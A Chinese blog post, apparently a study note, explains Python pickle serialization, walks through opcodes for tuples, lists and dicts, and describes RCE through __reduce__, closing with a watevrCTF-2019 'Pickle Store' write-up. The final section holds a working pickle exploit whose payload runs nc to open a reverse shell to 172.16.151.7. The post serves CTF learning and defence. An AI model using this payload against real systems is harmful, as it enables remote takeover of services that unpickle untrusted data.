---
title: Python pickle 反序列化分析
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-11-24 21:56:36
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1115212.jpg
---
buu上遇到个python pickle反序列化的题，顺便学习一下有关知识。

python反序列化简介与利用

相较于php的反序列化，python的反序列化更容易利用，危害也更大。在php的反序列化漏洞利用中我们必须挖掘复杂的利用链，但python的序列化和反序列化中却不需要那么麻烦，因为python序列化出来的是pickle流，这是一种栈语言，python能够实现的功能它也能实现，引用一下pickle的简介：

pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。
pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好,之后就以pickle库来进行演示。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124221718.png)

先通过几个例子来看下这几个函数的作用：

dump/load

#序列化
pickle.dump(obj, file, protocol=None,)
obj表示要进行封装的对象(必填参数）
file表示obj要写入的文件对象
以二进制可写模式打开即wb(必填参数）
#反序列化
pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
file文件中读取封存后的对象
以二进制可读模式打开即rb(必填参数)

dumps/loads

#序列化
pickle.dumps(obj, protocol=None,*,fix_imports=True)
dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
#反序列化
pickle.loads(bytes_object, *,fix_imports=True, encoding="ASCII". errors="strict")
loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。

python2

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124221317.png)

在python下输出如下：
b'\x80\x03X\x04\x00\x00\x00abcdq\x00.'
python2序列化输出的字符串可以放在python3里正常反序列化，但python3序列化输出的字符串却不能让python2反序列化。

不同pickle版本的操作码及其含义可以在python3的安装目录里搜索pickle.py查看，如下是一部分操作码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200301220031-0357b100-5bc5-1.png)

对于上面python上的结果进行分析
b'\x80\x03X\x04\x00\x00\x00abcdq\x00.'：

第一个字符\x80是一个操作码，pickle.py文件中的注释说明它的含义是用来声明pickle版本，后面跟着的\x03就代表了版本3；随后的X表示后面的四个字节代表了一个数字（小端序），即\x04\x00\x00\x00,值为4，表示下面跟着的utf8编码的字符串的长度，即后面跟着的abcd;再往后是q,这个没有查到详细的说明，看注释上的字面意思是后面即\x00是一个字节的参数，但也不知道这个有什么用，我猜测它是用来给参数做索引用的，索引存储在momo区，如果不需要用到取数据，可以把q\x00删掉，这并不影响反序列化，最后的.代表结束，这是每个pickle流末尾都会有的操作符。

来看看复杂类型的数据序列化后是什么样的：

    a=("item1","item2")
    b=["item1","item2"]
    c={"key1":"value1","key2":"value2"}
    print(pickle.dumps(a))
    print(pickle.dumps(b))
    print(pickle.dumps(c))

结果：

    b'\x80\x03X\x05\x00\x00\x00item1q\x00X\x05\x00\x00\x00item2q\x01\x86q\x02.'
    b'\x80\x03]q\x00(X\x05\x00\x00\x00item1q\x01X\x05\x00\x00\x00item2q\x02e.'
    b'\x80\x03}q\x00(X\x04\x00\x00\x00key1q\x01X\x06\x00\x00\x00value1q\x02X\x04\x00\x00\x00key2q\x03X\x06\x00\x00\x00value2q\x04u.'

先来看tuple的pickle流，在栈上连续定义了两个字符串最后在结尾加了\x86这个操作码，其含义为”利用栈顶的两个元素（即前面的item1和item2）建立一个元组”，后面的q\x02标识该元组在memo的索引，最后是.结束符。

再看list的pickle流，在版本声明的后面是一个]操作符，意思是在栈上建立一个空list，q\x00是这个列表在memo的索引，后面是一个(,这是一个很重要的操作符，它用来标记后面某个操作的参数的边界，在这里其实是用来告诉末尾的e（建立list的操作符），从(开始到e操作符前面的内容用来构建list，(标记前面的内容就不归e操作符管了。最后是.结束符。

最后来看dict的pickle流，在版本声明的后面是一个},表示在栈上建立一个空dict，q\x00表明了这个dict在memo区的索引，后面同样是(标记,后面按照先key后value的属性依次定义数据，并给每个数据定好memo区的索引，最后是u操作符，类似于上面的e操作符，它的含义为利用(标记到u之间的数据构建dict，最后是.操作符。

上面是python3情况下的分析，遇到python2的题可看此链接：
https://www.freebuf.com/articles/web/252189.html
或者直接看此图：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201124225901.jpg)

整个序列化的过程可以分为三个步骤

从对象中提权所有属性
写入对象的所有模块名和类名
写入对象所有属性的键值对

反序列化的过程就是序列化过程的逆过程。

#Pickle/CPickle反序列化漏洞分析

反序列化漏洞出现在 __reduce__()魔法函数上，这一点和PHP中的__wakeup()魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。

而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.

另外pickle.loads会解决import问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。

#漏洞可能出现的位置：

解析认证token、session的时候
将对象Pickle后存储成磁盘文件
将对象Pickle后在网络中传输
参数传递给程序

命令执行的例子：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124230851.png)

好了 下面开始解题

[watevrCTF-2019]Pickle Store

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201124233847.png)

cookie里看到奇怪代码，使用pickle.loads()和base64对这串字符进行解码反序列化

经过上面的学习，现在可谓是轻车熟路

    import pickle
    import base64

    print(pickle.loads(base64.b64decode("gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu")))

利用Pickle反序列化exp反弹shell

    import pickle
    import base64

    class A(object):
        def __reduce__(self):
            return (eval, ("__import__('os').system('nc 172.16.151.7 9999 -e/bin/sh')",))
    a = A()
    print(base64.b64encode(pickle.dumps(a)))



参考链接：
https://www.secshi.com/39791.html
https://www.freebuf.com/articles/web/252189.html
https://www.anquanke.com/post/id/188981